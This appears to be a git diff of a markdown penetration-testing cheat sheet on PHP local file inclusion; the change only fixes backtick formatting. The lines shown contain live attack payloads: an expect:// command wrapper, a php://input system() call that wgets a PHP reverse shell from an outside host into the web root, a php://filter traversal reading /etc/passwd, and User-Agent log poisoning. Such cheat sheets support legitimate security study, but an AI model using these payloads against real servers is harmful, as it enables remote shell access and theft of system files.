@@ -105,10 +105,10 @@
     - http://127.0.0.1/fileincl/example1.php?page=expect://ls
   - PHP (POST request) ```php://input```
     - http://192.168.183.128/fileincl/example1.php?page= **php://input**
-      - input can be: ```<? system('wget http://192.192.192.192/php-reverse-shell.php -O /var/www/shell.php');?>
+      - input can be: ```<? system('wget http://192.192.192.192/php-reverse-shell.php -O /var/www/shell.php');?>```
       - In browser: http://192.192.192.192/shell.php
   - PHP ```php://filter```
-    - http://192.192.192.192/fileincl/example1.php?page=**php://filter/convert.base64-encode/resource=../../../../../etc/passwd**
+    - http://192.192.192.192/fileincl/example1.php?page= **php://filter/convert.base64-encode/resource=../../../../../etc/passwd**
     - Must decode the output from base64
   - /proc/self/environ (If you able to write there)
     - Manipulate ```User Agent``` in Burp
